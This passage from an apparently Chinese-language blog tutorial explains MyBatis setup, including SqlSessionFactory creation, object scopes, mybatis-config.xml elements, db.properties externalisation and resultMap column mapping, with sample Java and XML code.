<p>从 XML 文件中构建 SqlSessionFactory 的实例非常简单，建议使用类路径下的资源文件进行配置。 但也可以使用任意的输入流（InputStream）实例，比如用文件路径字符串或 file:&#x2F;&#x2F; URL 构造的输入流。MyBatis 包含一个名叫 Resources 的工具类，它包含一些实用方法，使得从类路径或其它位置加载资源文件更加容易。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="string">&quot;org/mybatis/example/mybatis-config.xml&quot;</span>;</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Resources.getResourceAsStream(resource);</span><br><span class="line"><span class="type">SqlSessionFactory</span> <span class="variable">sqlSessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(inputStream);</span><br></pre></td></tr></table></figure>

<p>XML 配置文件中包含了对 MyBatis 系统的核心设置，包括获取数据库连接实例的数据源（DataSource）以及决定事务作用域和控制方式的事务管理器（TransactionManager）。这是主要的配置<code>mybatis-config.xml</code></p>
<p>先给出一个简单的示例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span></span></span><br><span class="line"><span class="meta">  <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">  <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span>   </span><br><span class="line">      <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span>  <span class="comment">&lt;!-- 事务管理 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;driver&#125;&quot;</span>/&gt;</span>  <span class="comment">&lt;!-- 连接池 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;url&#125;&quot;</span>/&gt;</span>        <span class="comment">&lt;!-- 位置 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;username&#125;&quot;</span>/&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;password&#125;&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;org/mybatis/example/BlogMapper.xml&quot;</span>/&gt;</span>  <span class="comment">&lt;!-- 对应实体类的mapper --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当然，还有很多可以在 XML 文件中配置的选项，上面的示例仅罗列了最关键的部分。 注意 XML 头部的声明，它用来验证 XML 文档的正确性。environment 元素体中包含了事务管理和连接池的配置。mappers 元素则包含了一组映射器（mapper），这些映射器的 XML 映射文件包含了 SQL 代码和映射定义信息。</p>
<h2 id="从-SqlSessionFactory-中获取-SqlSession"><a href="#从-SqlSessionFactory-中获取-SqlSession" class="headerlink" title="从 SqlSessionFactory 中获取 SqlSession"></a>从 SqlSessionFactory 中获取 SqlSession</h2><p>既然有了 SqlSessionFactory，顾名思义，我们可以从中获得 SqlSession 的实例。</p>
<p><strong>SqlSession 提供了在数据库执行 SQL 命令所需的所有方法。</strong></p>
<p>你可以通过 SqlSession 实例来使用和指定语句的参数和返回值相匹配的接口（比如 BlogMapper.class），现在你的代码不仅更清晰，更加类型安全，还不用担心可能出错的字符串字面值以及强制类型转换。</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">SqlSession</span> <span class="variable">session</span> <span class="operator">=</span> sqlSessionFactory.openSession()) &#123;</span><br><span class="line">  <span class="type">BlogMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> session.getMapper(BlogMapper.class);</span><br><span class="line">  <span class="type">Blog</span> <span class="variable">blog</span> <span class="operator">=</span> mapper.selectBlog(<span class="number">101</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="下面解释三个类"><a href="#下面解释三个类" class="headerlink" title="下面解释三个类"></a>下面解释三个类</h2><h3 id="SqlSessionFactoryBuilder"><a href="#SqlSessionFactoryBuilder" class="headerlink" title="SqlSessionFactoryBuilder"></a>SqlSessionFactoryBuilder</h3><p>这个类可以被实例化、使用和丢弃，一旦创建了 SqlSessionFactory，就不再需要它了。</p>
<p> 因此 SqlSessionFactoryBuilder 实例的最佳作用域是方法作用域（也就是局部方法变量）。</p>
<p> 你可以重用 SqlSessionFactoryBuilder 来创建多个 SqlSessionFactory 实例，但最好还是不要一直保留着它，以保证所有的 XML 解析资源可以被释放给更重要的事情。</p>
<h3 id="SqlSessionFactory"><a href="#SqlSessionFactory" class="headerlink" title="SqlSessionFactory"></a>SqlSessionFactory</h3><p>SqlSessionFactory 一旦被创建就应该在应用的运行期间一直存在，没有任何理由丢弃它或重新创建另一个实例。 使用 SqlSessionFactory 的最佳实践是在应用运行期间不要重复创建多次，多次重建 SqlSessionFactory 被视为一种代码“坏习惯”。</p>
<p>因此 SqlSessionFactory 的最佳作用域是应用作用域。 </p>
<p>有很多方法可以做到，最简单的就是使用单例模式或者静态单例模式。</p>
<h3 id="SqlSession"><a href="#SqlSession" class="headerlink" title="SqlSession"></a>SqlSession</h3><p>每个线程都应该有它自己的 SqlSession 实例。</p>
<p>SqlSession 的实例不是线程安全的，因此是不能被共享的，所以它的最佳的作用域是请求或方法作用域。</p>
<p> 绝对不能将 SqlSession 实例的引用放在一个类的静态域，甚至一个类的实例变量也不行。 也绝不能将 SqlSession 实例的引用放在任何类型的托管作用域中，比如 Servlet 框架中的 HttpSession。</p>
<p> 如果你现在正在使用一种 Web 框架，考虑将 SqlSession 放在一个和 HTTP 请求相似的作用域中。 </p>
<p><strong>换句话说，每次收到 HTTP 请求，就可以打开一个 SqlSession，返回一个响应后，就关闭它</strong>。 </p>
<p>这个关闭操作很重要，为了确保每次都能执行关闭操作，你应该把这个关闭操作放到 finally 块中。 下面的示例就是一个确保 SqlSession 关闭的标准模式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">SqlSession</span> <span class="variable">session</span> <span class="operator">=</span> sqlSessionFactory.openSession()) &#123;</span><br><span class="line">  <span class="comment">// 你的应用逻辑代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在所有代码中都遵循这种使用模式，可以保证所有数据库资源都能被正确地关闭。</p>
<h4 id="映射器实例"><a href="#映射器实例" class="headerlink" title="映射器实例"></a>映射器实例</h4><p>映射器是一些绑定映射语句的接口。映射器接口的实例是从 SqlSession 中获得的。虽然从技术层面上来讲，任何映射器实例的最大作用域与请求它们的 SqlSession 相同。但方法作用域才是映射器实例的最合适的作用域。 也就是说，映射器实例应该在调用它们的方法中被获取，使用完毕之后即可丢弃。 映射器实例并不需要被显式地关闭。尽管在整个请求作用域保留映射器实例不会有什么问题，但是你很快会发现，在这个作用域上管理太多像 SqlSession 的资源会让你忙不过来。 </p>
<p><strong>因此，最好将映射器放在方法作用域内</strong>。就像下面的例子一样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try (SqlSession session = sqlSessionFactory.openSession()) &#123;</span><br><span class="line">  BlogMapper mapper = session.getMapper(BlogMapper.class);</span><br><span class="line">  // 你的应用逻辑代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><p>总的来说，需要由<code>SqlSessionFactoryBuilder</code>生成<code>SqlSessionFactory</code>。</p>
<p>然后由工厂生成<code>SqlSession</code>，<strong>SqlSession 提供了在数据库执行 SQL 命令所需的所有方法。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> 	<span class="comment">//由SqlSession导到对应的Mapper类</span></span><br><span class="line"><span class="type">BlogMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> session.getMapper(BlogMapper.class);</span><br><span class="line"><span class="comment">//这样就可以使用这个mapper也就是利用xml文件生成的实现类进行Dao操作</span></span><br><span class="line"> 	<span class="type">Blog</span> <span class="variable">blog</span> <span class="operator">=</span> mapper.selectBlog(<span class="number">101</span>);</span><br></pre></td></tr></table></figure>

<h1 id="配置文件解析"><a href="#配置文件解析" class="headerlink" title="配置文件解析"></a>配置文件解析</h1><blockquote>
<p>核心配置文件</p>
</blockquote>
<ul>
<li>mybatis-config.xml 系统核心配置文件</li>
<li>MyBatis 的配置文件包含了会深深影响 MyBatis 行为的设置和属性信息。</li>
<li>能配置的内容如下：</li>
</ul>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">configuration（配置）</span></span><br><span class="line"><span class="attr">properties（属性）</span></span><br><span class="line"><span class="attr">settings（设置）</span></span><br><span class="line"><span class="attr">typeAliases（类型别名）</span></span><br><span class="line"><span class="attr">typeHandlers（类型处理器）</span></span><br><span class="line"><span class="attr">objectFactory（对象工厂）</span></span><br><span class="line"><span class="attr">plugins（插件）</span></span><br><span class="line"><span class="attr">environments（环境配置）</span></span><br><span class="line"><span class="attr">environment（环境变量）</span></span><br><span class="line"><span class="attr">transactionManager（事务管理器）</span></span><br><span class="line"><span class="attr">dataSource（数据源）</span></span><br><span class="line"><span class="attr">databaseIdProvider（数据库厂商标识）</span></span><br><span class="line"><span class="attr">mappers（映射器）</span></span><br><span class="line"><span class="attr">&lt;!--</span> <span class="string">注意元素节点的顺序！顺序不对会报错 --&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们可以阅读 mybatis-config.xml 上面的dtd的头文件！</p>
<h2 id="environments元素"><a href="#environments元素" class="headerlink" title="environments元素"></a>environments元素</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;...&quot;</span> <span class="attr">value</span>=<span class="string">&quot;...&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">transactionManager</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;url&#125;&quot;</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;username&#125;&quot;</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;password&#125;&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>配置MyBatis的多套运行环境，将SQL映射到多个不同的数据库上，必须指定其中一个为默认运行环境（通过default指定）</p>
</li>
<li><p>子元素节点：<strong>environment</strong></p>
</li>
<li><ul>
<li><p>dataSource 元素使用标准的 JDBC 数据源接口来配置 JDBC 连接对象的资源。</p>
</li>
<li><p>数据源是必须配置的。</p>
</li>
<li><p>有三种内建的数据源类型</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>=<span class="string">&quot;[UNPOOLED|POOLED|JNDI]&quot;</span>）</span><br></pre></td></tr></table></figure>
</li>
<li><p>unpooled：这个数据源的实现只是每次被请求时打开和关闭连接。</p>
</li>
<li><p><strong>pooled</strong>：这种数据源的实现利用“池”的概念将 JDBC 连接对象组织起来 , 这是一种使得并发 Web 应用快速响应请求的流行处理方式。</p>
</li>
<li><p>jndi：这个数据源的实现是为了能在如 Spring 或应用服务器这类容器中使用，容器可以集中或在外部配置数据源，然后放置一个 JNDI 上下文的引用。</p>
</li>
<li><p>数据源也有很多第三方的实现，比如dbcp，c3p0，druid等等….</p>
</li>
<li><p>这两种事务管理器类型都不需要设置任何属性。</p>
</li>
<li><p>具体的一套环境，通过设置id进行区别，id保证唯一！</p>
</li>
<li><p>子元素节点：transactionManager - [ 事务管理器 ]</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!-- 语法 --&gt;</span><br><span class="line">  &lt;transactionManager <span class="built_in">type</span>=<span class="string">&quot;[ JDBC | MANAGED ]&quot;</span>/&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 子元素节点：**数据源（dataSource）**</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mappers元素"><a href="#mappers元素" class="headerlink" title="mappers元素"></a>mappers元素</h2><p><strong>mappers</strong></p>
<ul>
<li>映射器 : 定义映射SQL语句文件</li>
<li>既然 MyBatis 的行为其他元素已经配置完了，我们现在就要定义 SQL 映射语句了。</li>
<li>但是首先我们需要告诉 MyBatis 到哪里去找到这些语句。Java 在自动查找这方面没有提供一个很好的方法，所以最佳的方式是告诉 MyBatis 到哪里去找映射文件。你可以使用相对于类路径的资源引用， 或完全限定资源定位符（包括 <code>file:///</code> 的 URL），或类名和包名等。映射器是MyBatis中最核心的组件之一，在MyBatis 3之前，只支持xml映射器，即：所有的SQL语句都必须在xml文件中配置。而从MyBatis 3开始，还支持接口映射器，这种映射器方式允许以Java代码的方式注解定义SQL语句，非常简洁。</li>
</ul>
<p><strong>引入资源方式</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用相对于类路径的资源引用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;org/mybatis/builder/PostMapper.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 使用完全限定资源定位符（URL） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">url</span>=<span class="string">&quot;file:///var/mappers/AuthorMapper.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">使用映射器接口实现类的完全限定类名</span></span><br><span class="line"><span class="comment">需要配置文件名称和接口名称一致，并且位于同一目录下</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.builder.AuthorMapper&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">将包内的映射器接口实现全部注册为映射器</span></span><br><span class="line"><span class="comment">但是需要配置文件名称和接口名称一致，并且位于同一目录下</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;org.mybatis.builder&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="对应Mapper文件"><a href="#对应Mapper文件" class="headerlink" title="对应Mapper文件"></a><strong>对应Mapper文件</strong></h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span></span></span><br><span class="line"><span class="meta">       <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">       <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.kuang.mapper.UserMapper&quot;</span>&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>namespace中文意思：命名空间，作用如下：</p>
</li>
<li><ul>
<li>namespace的命名必须跟某个接口同名</li>
<li>接口中的方法与映射文件中sql语句id应该一一对应</li>
</ul>
</li>
<li><ol>
<li>namespace和子元素的id联合保证唯一  , 区别不同的mapper</li>
<li>绑定DAO接口</li>
<li>namespace命名规则 : 包名+类名</li>
</ol>
</li>
</ul>
<p>MyBatis 的真正强大在于它的映射语句，这是它的魔力所在。由于它的异常强大，映射器的 XML 文件就显得相对简单。如果拿它跟具有相同功能的 JDBC 代码进行对比，你会立即发现省掉了将近 95% 的代码。MyBatis 为聚焦于 SQL 而构建，以尽可能地为你减少麻烦。</p>
<h2 id="Properties优化"><a href="#Properties优化" class="headerlink" title="Properties优化"></a>Properties优化</h2><p>数据库这些属性都是可外部配置且可动态替换的，既可以在典型的 Java 属性文件中配置，亦可通过 properties 元素的子元素来传递。具体的官方文档</p>
<p>我们来优化我们的配置文件</p>
<p>第一步 ; 在资源目录下新建一个db.properties</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">driver</span>=<span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line"><span class="attr">url</span>=<span class="string">jdbc:mysql://localhost:3306/mybatis?useSSL=true&amp;useUnicode=true&amp;characterEncoding=utf8</span></span><br><span class="line"><span class="attr">username</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">password</span>=<span class="string">123456</span></span><br></pre></td></tr></table></figure>

<p>第二步 : 将文件导入properties 配置文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--导入properties文件--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">&quot;db.properties&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;url&#125;&quot;</span>/&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;username&#125;&quot;</span>/&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;password&#125;&quot;</span>/&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;mapper/UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>配置文件优先级问题</li>
<li>新特性：使用占位符</li>
</ul>
<h1 id="映射参数处理"><a href="#映射参数处理" class="headerlink" title="映射参数处理"></a>映射参数处理</h1><p>在mapper.xml中，我们对于结果集和对象不匹配的时候，需要进行映射参数处理</p>
<h2 id="Select"><a href="#Select" class="headerlink" title="Select"></a>Select</h2><p>在select中，我们有这些参数可供使用：</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>id</code></td>
<td align="left">在命名空间中唯一的标识符，可以被用来引用这条语句。</td>
</tr>
<tr>
<td align="left"><code>parameterType</code></td>
<td align="left">将会传入这条语句的参数的类全限定名或别名。这个属性是可选的，因为 MyBatis 可以通过类型处理器（TypeHandler）推断出具体传入语句的参数，默认值为未设置（unset）。</td>
</tr>
<tr>
<td align="left">parameterMap</td>
<td align="left">用于引用外部 parameterMap 的属性，<strong>目前已被废弃</strong>。请使用行内参数映射和 parameterType 属性。</td>
</tr>
<tr>
<td align="left"><code>resultType</code></td>
<td align="left">期望从这条语句中返回结果的类全限定名或别名。 注意，如果返回的是集合，那应该设置为集合包含的类型，而不是集合本身的类型。 resultType 和 resultMap 之间只能同时使用一个。</td>
</tr>
<tr>
<td align="left"><code>resultMap</code></td>
<td align="left">对外部 resultMap 的命名引用。结果映射是 MyBatis 最强大的特性，如果你对其理解透彻，许多复杂的映射问题都能迎刃而解。 resultType 和 resultMap 之间只能同时使用一个。</td>
</tr>
<tr>
<td align="left"><code>flushCache</code></td>
<td align="left">将其设置为 true 后，只要语句被调用，都会导致本地缓存和二级缓存被清空，默认值：false。</td>
</tr>
<tr>
<td align="left"><code>useCache</code></td>
<td align="left">将其设置为 true 后，将会导致本条语句的结果被二级缓存缓存起来，默认值：对 select 元素为 true。</td>
</tr>
<tr>
<td align="left"><code>timeout</code></td>
<td align="left">这个设置是在抛出异常之前，驱动程序等待数据库返回请求结果的秒数。默认值为未设置（unset）（依赖数据库驱动）。</td>
</tr>
<tr>
<td align="left"><code>fetchSize</code></td>
<td align="left">这是一个给驱动的建议值，尝试让驱动程序每次批量返回的结果行数等于这个设置值。 默认值为未设置（unset）（依赖驱动）。</td>
</tr>
<tr>
<td align="left"><code>statementType</code></td>
<td align="left">可选 STATEMENT，PREPARED 或 CALLABLE。这会让 MyBatis 分别使用 Statement，PreparedStatement 或 CallableStatement，默认值：PREPARED。</td>
</tr>
<tr>
<td align="left"><code>resultSetType</code></td>
<td align="left">FORWARD_ONLY，SCROLL_SENSITIVE, SCROLL_INSENSITIVE 或 DEFAULT（等价于 unset） 中的一个，默认值为 unset （依赖数据库驱动）。</td>
</tr>
<tr>
<td align="left"><code>databaseId</code></td>
<td align="left">如果配置了数据库厂商标识（databaseIdProvider），MyBatis 会加载所有不带 databaseId 或匹配当前 databaseId 的语句；如果带和不带的语句都有，则不带的会被忽略。</td>
</tr>
<tr>
<td align="left"><code>resultOrdered</code></td>
<td align="left">这个设置仅针对嵌套结果 select 语句：如果为 true，将会假设包含了嵌套结果集或是分组，当返回一个主结果行时，就不会产生对前面结果集的引用。 这就使得在获取嵌套结果集的时候不至于内存不够用。默认值：<code>false</code>。</td>
</tr>
<tr>
<td align="left"><code>resultSets</code></td>
<td align="left">这个设置仅适用于多结果集的情况。它将列出语句执行后返回的结果集并赋予每个结果集一个名称，多个名称之间以逗号分隔。</td>
</tr>
</tbody></table>
<p>对于这种不匹配的问题，常有两种方案</p>
<p>方案一：为列名指定别名 , 别名和java实体类的属性名一致 .</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectUserById&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">  select id , name , pwd as password from user where id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>方案二：使用结果集映射-&gt;ResultMap</strong> 【推荐】</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;UserMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- id为主键 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- column是数据库表的列名 , property是对应实体类的属性名 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;name&quot;</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;pwd&quot;</span> <span class="attr">property</span>=<span class="string">&quot;password&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectUserById&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;UserMap&quot;</span>&gt;</span></span><br><span class="line">  select id , name , pwd from user where id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果这个世界总是这么简单就好了。【苦笑</p>
<h2 id="高级结果映射"><a href="#高级结果映射" class="headerlink" title="高级结果映射"></a>高级结果映射</h2><p>MyBatis 创建时的一个思想是：数据库不可能永远是你所想或所需的那个样子。 我们希望每个数据库都具备良好的第三范式或 BCNF 范式，可惜它们并不都是那样。 如果能有一种数据库映射模式，完美适配所有的应用程序，那就太好了，但可惜也没有。</p>
<p> 而 ResultMap 就是 MyBatis 对这个问题的答案。</p>
<p><code>resultMap</code> 元素有很多子元素和一个值得深入探讨的结构。 下面是<code>resultMap</code> 元素的概念视图。</p>
<h3 id="结果映射（resultMap）"><a href="#结果映射（resultMap）" class="headerlink" title="结果映射（resultMap）"></a>结果映射（resultMap）</h3><ul>
<li><p>association</p>
<p>– 一个复杂类型的关联；许多结果将包装成这种类型</p>
<ul>
<li>嵌套结果映射 – 关联可以是 <code>resultMap</code> 元素，或是对其它结果映射的引用</li>
</ul>
</li>
<li><p>collection</p>
<p>– 一个复杂类型的集合</p>
<ul>
